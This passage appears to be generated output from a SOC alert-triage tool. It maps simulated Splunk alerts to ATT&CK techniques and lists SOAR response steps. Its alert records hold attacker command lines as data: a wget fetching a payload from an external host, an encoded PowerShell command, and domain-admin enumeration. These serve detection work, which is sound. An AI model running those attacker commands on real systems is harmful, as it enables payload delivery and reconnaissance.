+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.60",
+        "prioritize_patch_and_isolation"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.60",
+        "top_cve": "CVE-2021-41773",
+        "title": "Apache Path Traversal",
+        "risk_score": 15.5,
+        "priority": "critical"
+      },
+      "final_disposition": {
+        "incident_type": "persistence",
+        "urgency": "medium",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "WEB01",
+      "criticality": 9
+    },
+    "investigation_state": {
+      "alert_id": "splunk-5",
+      "alert": {
+        "alert_id": "splunk-5",
+        "event_type": "web_activity",
+        "log_source": "splunk",
+        "source_ip": "172.16.1.55",
+        "destination_ip": "10.0.0.60",
+        "username": "www-data",
+        "process_name": "",
+        "command_line": "",
+        "details": "HTTP POST upload to /upload/shell.aspx | Suspicious web shell upload attempt",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:30:00Z",
+        "http": {
+          "method": "POST",
+          "uri": "/upload/shell.aspx",
+          "user_agent": "curl/8.0"
+        }
+      },
+      "severity": "medium",
+      "triage_score": 30,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1505.003",
+        "technique_name": "Web Shell"
+      },
+      "incident_type": "persistence",
+      "playbook": "persistence_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L www-data",
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.60",
+        "prioritize_patch_and_isolation"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L www-data",
+            "volatility -f memory.dump --profile=Win10x64 pslist",
+            "networkctl isolate 10.0.0.60",
+            "prioritize_patch_and_isolation"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-6",
+    "alert": {
+      "alert_id": "splunk-6",
+      "event_type": "file_transfer",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.60",
+      "destination_ip": "198.51.100.22",
+      "username": "www-data",
+      "process_name": "wget",
+      "command_line": "wget http://198.51.100.22/payload.zip",
+      "details": "Payload retrieval from external server | Splunk detection: Ingress Tool Transfer",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:35:00Z",
+      "http": {
+        "method": "GET",
+        "uri": "/payload.zip",
+        "user_agent": "wget/1.21"
+      }
+    },
+    "triage": {
+      "triage_score": 30,
+      "severity": "medium"
+    },
+    "query_used": "file_transfer splunk payload retrieval from external server | splunk detection: ingress tool transfer wget http://198.51.100.22/payload.zip wget www-data 10.0.0.60 198.51.100.22",
+    "matches": [
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactics": [
+          "command-and-control"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 1.0,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.5,
+        "confidence": 100.0,
+        "explanation": [
+          "Payload download"
+        ]
+      },
+      {
+        "technique_id": "T1570",
+        "name": "Lateral Tool Transfer",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.6291,
+        "embedding_score": 0.9544,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3796,
+        "confidence": 91.97,
+        "explanation": [
+          "Payload download"
+        ]
+      },
+      {
+        "technique_id": "T1608.002",
+        "name": "Upload Tool",
+        "tactics": [
+          "resource-development"
+        ],
+        "tfidf_score": 0.5605,
+        "embedding_score": 0.9974,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3676,
+        "confidence": 91.17,
+        "explanation": [
+          "Payload download"
+        ]
+      },
+      {
+        "technique_id": "T1036.008",
+        "name": "Masquerade File Type",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.5319,
+        "embedding_score": 0.82,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3236,
+        "confidence": 88.24,
+        "explanation": [
+          "Payload download"
+        ]
+      },
+      {
+        "technique_id": "T1659",
+        "name": "Content Injection",
+        "tactics": [
+          "initial-access",
+          "command-and-control"
+        ],
+        "tfidf_score": 0.4076,
+        "embedding_score": 0.8724,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.2968,
+        "confidence": 86.45,
+        "explanation": [
+          "Payload download"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Check remote service creation, SMB, WinRM, RDP, WMI, and PsExec activity",
+      "Review east-west traffic and admin share access",
+      "Scope additional hosts touched by the same account or source system",
+      "Validate source IP reputation and geolocation",
+      "Review authentication logs for spray or brute-force patterns",
+      "Enforce MFA and reset affected credentials if warranted"
+    ],
+    "soar": {
+      "incident_type": "lateral_movement",
+      "urgency": "medium",
+      "recommended_actions": [
+        "usermod -L www-data",
+        "networkctl isolate 198.51.100.22",
+        "iptables -A INPUT -s 10.0.0.60 -j DROP"
+      ],
+      "playbook": "lateral_movement_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potentially suspicious behavior that should be investigated.",
+      "risk_summary": "Technique: Ingress Tool Transfer | Tactics: command-and-control | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L www-data",
+        "networkctl isolate 198.51.100.22",
+        "iptables -A INPUT -s 10.0.0.60 -j DROP"
+      ],
+      "context": "User: www-data | Source IP: 10.0.0.60 | Destination IP: 198.51.100.22"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "confidence": 100.0,
+        "tactics": [
+          "command-and-control"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "potential_host_spread",
+        "user_activity_correlation_found",
+        "ioc_enrichment_hit",
+        "known_threat_indicator"
+      ],
+      "enrichment_steps": [
+        "correlate destination hosts for same user",
+        "review east-west movement patterns"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-5"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.60",
+        "destination_ip": "198.51.100.22",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": [
+          "destination_ip_match:known_malicious_test_feed"
+        ]
+      },
+      "recommended_next_steps": [
+        "usermod -L www-data",
+        "networkctl isolate 198.51.100.22",
+        "iptables -A INPUT -s 10.0.0.60 -j DROP",
+        "escalate_to_ir"
+      ],
+      "vulnerability_context": {
+        "asset": "198.51.100.22",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "lateral_movement",
+        "urgency": "medium",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "unknown",
+      "criticality": 1
+    },
+    "investigation_state": {
+      "alert_id": "splunk-6",
+      "alert": {
+        "alert_id": "splunk-6",
+        "event_type": "file_transfer",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.60",
+        "destination_ip": "198.51.100.22",
+        "username": "www-data",
+        "process_name": "wget",
+        "command_line": "wget http://198.51.100.22/payload.zip",
+        "details": "Payload retrieval from external server | Splunk detection: Ingress Tool Transfer",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:35:00Z",
+        "http": {
+          "method": "GET",
+          "uri": "/payload.zip",
+          "user_agent": "wget/1.21"
+        }
+      },
+      "severity": "medium",
+      "triage_score": 30,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer"
+      },
+      "incident_type": "lateral_movement",
+      "playbook": "lateral_movement_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L www-data",
+        "networkctl isolate 198.51.100.22",
+        "iptables -A INPUT -s 10.0.0.60 -j DROP",
+        "escalate_to_ir"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L www-data",
+            "networkctl isolate 198.51.100.22",
+            "iptables -A INPUT -s 10.0.0.60 -j DROP",
+            "escalate_to_ir"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-7",
+    "alert": {
+      "alert_id": "splunk-7",
+      "event_type": "remote_logon",
+      "log_source": "splunk",
+      "source_ip": "203.0.113.99",
+      "destination_ip": "10.0.0.22",
+      "username": "corp\\helpdesk",
+      "process_name": "mstsc.exe",
+      "command_line": "mstsc.exe /v:10.0.0.22",
+      "details": "RDP connection from unusual external source | Splunk detection: Suspicious RDP Activity",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:40:00Z",
+      "service": "rdp",
+      "dst_port": 3389
+    },
+    "triage": {
+      "triage_score": 30,
+      "severity": "medium"
+    },
+    "query_used": "remote_logon splunk rdp connection from unusual external source | splunk detection: suspicious rdp activity mstsc.exe /v:10.0.0.22 mstsc.exe corp\\helpdesk 203.0.113.99 10.0.0.22",
+    "matches": [
+      {
+        "technique_id": "T1563.002",
+        "name": "RDP Hijacking",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.9511,
+        "embedding_score": 1.0,
+        "rule_score": 1.0,
+        "field_match_score": 0.0,
+        "final_score": 0.9853,
+        "confidence": 100.0,
+        "explanation": [
+          "RDP activity"
+        ]
+      },
+      {
+        "technique_id": "T1070.007",
+        "name": "Clear Network Connection History and Configurations",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.8825,
+        "rule_score": 1.0,
+        "field_match_score": 0.0,
+        "final_score": 0.9765,
+        "confidence": 99.11,
+        "explanation": [
+          "RDP activity"
+        ]
+      },
+      {
+        "technique_id": "T1021.001",
+        "name": "Remote Desktop Protocol",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.997,
+        "embedding_score": 0.8394,
+        "rule_score": 1.0,
+        "field_match_score": 0.0,
+        "final_score": 0.967,
+        "confidence": 98.14,
+        "explanation": [
+          "RDP activity"
+        ]
+      },
+      {
+        "technique_id": "T1505.005",
+        "name": "Terminal Services DLL",
+        "tactics": [
+          "persistence"
+        ],
+        "tfidf_score": 0.5936,
+        "embedding_score": 0.7625,
+        "rule_score": 1.0,
+        "field_match_score": 0.0,
+        "final_score": 0.8306,
+        "confidence": 84.3,
+        "explanation": [
+          "RDP activity"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol",
+        "tactics": [
+          "command-and-control"
+        ],
+        "tfidf_score": 0.67,
+        "embedding_score": 0.6058,
+        "rule_score": 1.0,
+        "field_match_score": 0.0,
+        "final_score": 0.8222,
+        "confidence": 83.45,
+        "explanation": [
+          "RDP activity"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Check remote service creation, SMB, WinRM, RDP, WMI, and PsExec activity",
+      "Review east-west traffic and admin share access",
+      "Scope additional hosts touched by the same account or source system",
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "lateral_movement",
+      "urgency": "medium",
+      "recommended_actions": [
+        "usermod -L corp\\helpdesk",
+        "networkctl isolate 10.0.0.22",
+        "iptables -A INPUT -s 203.0.113.99 -j DROP"
+      ],
+      "playbook": "lateral_movement_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert suggests lateral movement, where an attacker may be spreading across systems.",
+      "risk_summary": "Technique: RDP Hijacking | Tactics: lateral-movement | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L corp\\helpdesk",
+        "networkctl isolate 10.0.0.22",
+        "iptables -A INPUT -s 203.0.113.99 -j DROP"
+      ],
+      "context": "User: corp\\helpdesk | Source IP: 203.0.113.99 | Destination IP: 10.0.0.22"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1563.002",
+        "technique_name": "RDP Hijacking",
+        "confidence": 100.0,
+        "tactics": [
+          "lateral-movement"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "potential_host_spread",
+        "ioc_enrichment_hit",
+        "known_threat_indicator",
+        "high_risk_asset_at_risk"
+      ],
+      "enrichment_steps": [
+        "correlate destination hosts for same user",
+        "review east-west movement patterns"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": []
+      },
+      "ioc_enrichment": {
+        "source_ip": "203.0.113.99",
+        "destination_ip": "10.0.0.22",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": [
+          "source_ip_match:suspicious_external_source"
+        ]
+      },
+      "recommended_next_steps": [
+        "usermod -L corp\\helpdesk",
+        "networkctl isolate 10.0.0.22",
+        "iptables -A INPUT -s 203.0.113.99 -j DROP",
+        "escalate_to_ir",
+        "expedite_patch_window"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.22",
+        "top_cve": "CVE-2021-34527",
+        "title": "PrintNightmare",
+        "risk_score": 13.8,
+        "priority": "high"
+      },
+      "final_disposition": {
+        "incident_type": "lateral_movement",
+        "urgency": "medium",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "PRINT01",
+      "criticality": 7
+    },
+    "investigation_state": {
+      "alert_id": "splunk-7",
+      "alert": {
+        "alert_id": "splunk-7",
+        "event_type": "remote_logon",
+        "log_source": "splunk",
+        "source_ip": "203.0.113.99",
+        "destination_ip": "10.0.0.22",
+        "username": "corp\\helpdesk",
+        "process_name": "mstsc.exe",
+        "command_line": "mstsc.exe /v:10.0.0.22",
+        "details": "RDP connection from unusual external source | Splunk detection: Suspicious RDP Activity",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:40:00Z",
+        "service": "rdp",
+        "dst_port": 3389
+      },
+      "severity": "medium",
+      "triage_score": 30,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1563.002",
+        "technique_name": "RDP Hijacking"
+      },
+      "incident_type": "lateral_movement",
+      "playbook": "lateral_movement_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L corp\\helpdesk",
+        "networkctl isolate 10.0.0.22",
+        "iptables -A INPUT -s 203.0.113.99 -j DROP",
+        "escalate_to_ir",
+        "expedite_patch_window"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L corp\\helpdesk",
+            "networkctl isolate 10.0.0.22",
+            "iptables -A INPUT -s 203.0.113.99 -j DROP",
+            "escalate_to_ir",
+            "expedite_patch_window"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-8",
+    "alert": {
+      "alert_id": "splunk-8",
+      "event_type": "process_execution",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.23",
+      "destination_ip": "10.0.0.23",
+      "username": "corp\\jdoe",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+      "details": "Obfuscated PowerShell command execution | Splunk detection: Command Obfuscation",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:45:00Z"
+    },
+    "triage": {
+      "triage_score": 55,
+      "severity": "high"
+    },
+    "query_used": "process_execution splunk obfuscated powershell command execution | splunk detection: command obfuscation powershell.exe -encodedcommand jabxagmapqboaguadwatae8aygbqaguaywb0aa== powershell.exe corp\\jdoe 10.0.0.23 10.0.0.23 execution powershell command scripting obfuscation defense evasion",
+    "matches": [
+      {
+        "technique_id": "T1027.010",
+        "name": "Command Obfuscation",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.9561,
+        "embedding_score": 1.0,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.2368,
+        "confidence": 100.0,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1059.001",
+        "name": "PowerShell",
+        "tactics": [
+          "execution"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.7555,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.2011,
+        "confidence": 97.11,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1546.013",
+        "name": "PowerShell Profile",
+        "tactics": [
+          "privilege-escalation",
+          "persistence"
+        ],
+        "tfidf_score": 0.7437,
+        "embedding_score": 0.6351,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.1001,
+        "confidence": 88.95,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.5051,
+        "embedding_score": 0.6895,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.0395,
+        "confidence": 84.05,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1070.003",
+        "name": "Clear Command History",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.648,
+        "embedding_score": 0.4704,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.0385,
+        "confidence": 83.97,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Isolate affected host if malicious execution is confirmed",
+      "Collect process tree, command-line, and parent-child telemetry",
+      "Review script block logs, PowerShell logs, or EDR execution traces",
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "defense_evasion",
+      "urgency": "critical",
+      "recommended_actions": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.23",
+        "iptables -A INPUT -s 10.0.0.23 -j DROP"
+      ],
+      "playbook": "defense_evasion_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates suspicious execution behavior, which may allow attackers to run arbitrary code on the system.",
+      "risk_summary": "Technique: Command Obfuscation | Tactics: defense-evasion | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.23",
+        "iptables -A INPUT -s 10.0.0.23 -j DROP"
+      ],
+      "context": "User: corp\\jdoe | Source IP: 10.0.0.23 | Destination IP: 10.0.0.23"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1027.010",
+        "technique_name": "Command Obfuscation",
+        "confidence": 100.0,
+        "tactics": [
+          "defense-evasion"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "stealth_behavior",
+        "user_activity_correlation_found"
+      ],
+      "enrichment_steps": [
+        "review tampering or logging impairment indicators",
+        "collect process lineage and script execution context"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-2",
+          "splunk-3",
+          "splunk-9",
+          "splunk-10"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.23",
+        "destination_ip": "10.0.0.23",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.23",
+        "iptables -A INPUT -s 10.0.0.23 -j DROP"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.23",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "defense_evasion",
+        "urgency": "critical",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "WS02",
+      "criticality": 5
+    },
+    "investigation_state": {
+      "alert_id": "splunk-8",
+      "alert": {
+        "alert_id": "splunk-8",
+        "event_type": "process_execution",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.23",
+        "destination_ip": "10.0.0.23",
+        "username": "corp\\jdoe",
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -EncodedCommand JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+        "details": "Obfuscated PowerShell command execution | Splunk detection: Command Obfuscation",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:45:00Z"
+      },
+      "severity": "high",
+      "triage_score": 55,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1027.010",
+        "technique_name": "Command Obfuscation"
+      },
+      "incident_type": "defense_evasion",
+      "playbook": "defense_evasion_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.23",
+        "iptables -A INPUT -s 10.0.0.23 -j DROP"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "volatility -f memory.dump --profile=Win10x64 pslist",
+            "networkctl isolate 10.0.0.23",
+            "iptables -A INPUT -s 10.0.0.23 -j DROP"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-9",
+    "alert": {
+      "alert_id": "splunk-9",
+      "event_type": "enumeration",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.24",
+      "destination_ip": "10.0.0.24",
+      "username": "corp\\jdoe",
+      "process_name": "whoami.exe",
+      "command_line": "whoami /all && net user && net group \"Domain Admins\" /domain",
+      "details": "Account enumeration and group membership discovery | Splunk detection: User Discovery Activity",
+      "severity": "medium",
+      "raw_time": "2026-04-05T19:50:00Z"
+    },
+    "triage": {
+      "triage_score": 0,
+      "severity": "low"
+    },
+    "query_used": "enumeration splunk account enumeration and group membership discovery | splunk detection: user discovery activity whoami /all && net user && net group \"domain admins\" /domain whoami.exe corp\\jdoe 10.0.0.24 10.0.0.24",
+    "matches": [
+      {
+        "technique_id": "T1087.002",
+        "name": "Domain Account",
+        "tactics": [
+          "discovery"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 1.0,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.5,
+        "confidence": 100.0,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1069.002",
+        "name": "Domain Groups",
+        "tactics": [
+          "discovery"
+        ],
+        "tfidf_score": 0.8849,
+        "embedding_score": 0.9586,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4572,
+        "confidence": 91.44,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactics": [
+          "discovery"
+        ],
+        "tfidf_score": 0.6116,
+        "embedding_score": 0.7989,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3432,
+        "confidence": 68.64,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1098.007",
+        "name": "Additional Local or Domain Groups",
+        "tactics": [
+          "persistence",
+          "privilege-escalation"
+        ],
+        "tfidf_score": 0.7268,
+        "embedding_score": 0.6111,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3403,
+        "confidence": 68.06,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1136.002",
+        "name": "Domain Account",
+        "tactics": [
+          "persistence"
+        ],
+        "tfidf_score": 0.6423,
+        "embedding_score": 0.6978,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3323,
+        "confidence": 66.46,
+        "explanation": []
+      }
+    ],
+    "recommended_actions": [
+      "Review host and account enumeration activity",
+      "Determine whether the behavior aligns with expected admin activity",
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "reconnaissance",
+      "urgency": "low",
+      "recommended_actions": [
+        "logger 'Monitoring suspicious activity for user corp\\jdoe from 10.0.0.24'",
+        "grep 'corp\\jdoe' output/mapped_alerts.json",
+        "echo 'corp\\jdoe' >> output/watchlist.txt"
+      ],
+      "playbook": "reconnaissance_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potentially suspicious behavior that should be investigated.",
+      "risk_summary": "Technique: Domain Account | Tactics: discovery | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "logger 'Monitoring suspicious activity for user corp\\jdoe from 10.0.0.24'",
+        "grep 'corp\\jdoe' output/mapped_alerts.json",
+        "echo 'corp\\jdoe' >> output/watchlist.txt"
+      ],
+      "context": "User: corp\\jdoe | Source IP: 10.0.0.24 | Destination IP: 10.0.0.24"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1087.002",
+        "technique_name": "Domain Account",
+        "confidence": 100.0,
+        "tactics": [
+          "discovery"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "pre_attack_recon",
+        "user_activity_correlation_found"
+      ],
+      "enrichment_steps": [
+        "look for follow-on auth, execution, or lateral activity"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-2",
+          "splunk-3",
+          "splunk-8",
+          "splunk-10"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.24",
+        "destination_ip": "10.0.0.24",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "logger 'Monitoring suspicious activity for user corp\\jdoe from 10.0.0.24'",
+        "grep 'corp\\jdoe' output/mapped_alerts.json",
+        "echo 'corp\\jdoe' >> output/watchlist.txt"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.24",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "reconnaissance",
+        "urgency": "low",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "unknown",
+      "criticality": 1
+    },
+    "investigation_state": {
+      "alert_id": "splunk-9",
+      "alert": {
+        "alert_id": "splunk-9",
+        "event_type": "enumeration",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.24",
+        "destination_ip": "10.0.0.24",
+        "username": "corp\\jdoe",
+        "process_name": "whoami.exe",
+        "command_line": "whoami /all && net user && net group \"Domain Admins\" /domain",
+        "details": "Account enumeration and group membership discovery | Splunk detection: User Discovery Activity",
+        "severity": "medium",
+        "raw_time": "2026-04-05T19:50:00Z"
+      },
+      "severity": "low",
+      "triage_score": 0,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1087.002",
+        "technique_name": "Domain Account"
+      },
+      "incident_type": "reconnaissance",
+      "playbook": "reconnaissance_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "logger 'Monitoring suspicious activity for user corp\\jdoe from 10.0.0.24'",
+        "grep 'corp\\jdoe' output/mapped_alerts.json",
+        "echo 'corp\\jdoe' >> output/watchlist.txt"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "logger 'Monitoring suspicious activity for user corp\\jdoe from 10.0.0.24'",
+            "grep 'corp\\jdoe' output/mapped_alerts.json",
+            "echo 'corp\\jdoe' >> output/watchlist.txt"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-10",
+    "alert": {
+      "alert_id": "splunk-10",
+      "event_type": "archive_activity",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.26",
+      "destination_ip": "10.0.0.10",
+      "username": "corp\\jdoe",
+      "process_name": "7z.exe",
+      "command_line": "7z.exe a finance_backup.7z C:\\Finance\\*.xlsx",
+      "details": "Archive creation of sensitive files prior to transfer | Splunk detection: Archive Collected Data",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:55:00Z"
+    },
+    "triage": {
+      "triage_score": 30,
+      "severity": "medium"
+    },
+    "query_used": "archive_activity splunk archive creation of sensitive files prior to transfer | splunk detection: archive collected data 7z.exe a finance_backup.7z c:\\finance\\*.xlsx 7z.exe corp\\jdoe 10.0.0.26 10.0.0.10",
+    "matches": [
+      {
+        "technique_id": "T1560",
+        "name": "Archive Collected Data",
+        "tactics": [
+          "collection"
+        ],
+        "tfidf_score": 0.9919,
+        "embedding_score": 0.9015,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4779,
+        "confidence": 100.0,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1074.001",
+        "name": "Local Data Staging",
+        "tactics": [
+          "collection"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.7641,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4528,
+        "confidence": 94.75,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1027.015",
+        "name": "Compression",
+        "tactics": [
+          "defense-evasion"
+        ],
